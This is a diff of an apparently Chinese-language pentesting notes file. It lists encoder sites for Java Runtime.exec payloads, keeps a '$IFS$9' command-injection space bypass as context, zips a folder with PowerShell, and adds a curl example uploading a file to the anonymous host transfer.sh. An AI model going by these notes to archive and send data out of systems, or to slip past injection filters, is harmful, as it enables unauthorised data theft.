@@ -7,7 +7,7 @@
 
 
 # java命令执行
-如下编码网站：
+如下编码网站：   
 https://ares-x.com/tools/runtime-exec/    
 https://r0yanx.com/tools/java_exec_encode/    
 https://www.bugku.net/runtime-exec-payloads/   
@@ -85,6 +85,20 @@ $IFS$9
 
 ```
 powershell -Command "Compress-Archive -Path E:\update\ -DestinationPath E:\test.zip"
+```
+
+# 匿名文件存储
+可用命令行   
+https://transfer.sh/
+使用很简单   
+```
+上传，成功后返回随机路径
+curl --upload-file ./hello.txt https://transfer.sh/hello.txt
+
+获取
+https://transfer.sh/fF6OA7aF8o/hello.txt
+
+
 ```
 
 
